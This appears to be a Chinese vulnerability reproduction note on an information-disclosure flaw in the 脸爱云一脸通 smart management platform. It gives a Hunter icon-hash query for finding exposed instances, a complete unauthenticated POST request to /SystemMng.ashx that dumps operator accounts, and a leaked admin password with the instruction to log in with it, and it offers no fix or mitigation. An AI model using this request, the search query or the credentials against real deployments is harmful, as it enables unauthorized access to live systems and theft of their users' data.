# 脸爱云一脸通智慧管理平台SystemMng存在信息泄露漏洞

# 一、漏洞简介
<font style="color:rgba(0, 0, 0, 0.9);">脸爱云一脸通智慧管理平台是一套功能强大，运行稳定，操作简单方便，用户界面美观，轻松统计数据的一脸通系统。无需安装，只需在后台配置即可在浏览器登录。脸爱云一脸通智慧管理平台SystemMng存在信息泄露漏洞。</font>

# <font style="color:rgba(0, 0, 0, 0.9);">二、影响版本</font>
+ 脸爱云一脸通智慧管理平台

# 三、资产测绘
+ hunter`web.icon=="4f0be080512ee0b45fc90ff894b6ba60"`
+ 特征

![1700642739314-bb174ac2-c85b-471b-90e8-ed6c02ba5c28.png](./img/KtUZ6_k7ZH5x80Dq/1700642739314-bb174ac2-c85b-471b-90e8-ed6c02ba5c28-429358.png)

# 四、漏洞复现
```java
POST /SystemMng.ashx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
Content-Length: 91
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest

page=1&arr_search=%7B%22username%22%3A%22%22%2C%22memo%22%3A%22%22%7D&funcName=getOperators
```

![1714289895012-ee2f78c8-a94c-4a20-ad0c-e26a9fb89139.png](./img/KtUZ6_k7ZH5x80Dq/1714289895012-ee2f78c8-a94c-4a20-ad0c-e26a9fb89139-479801.png)

使用泄露的账号密码登录系统`admin/LSFace2023`





> 更新: 2024-04-28 15:39:23  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/qgkd6zg49i5orfef>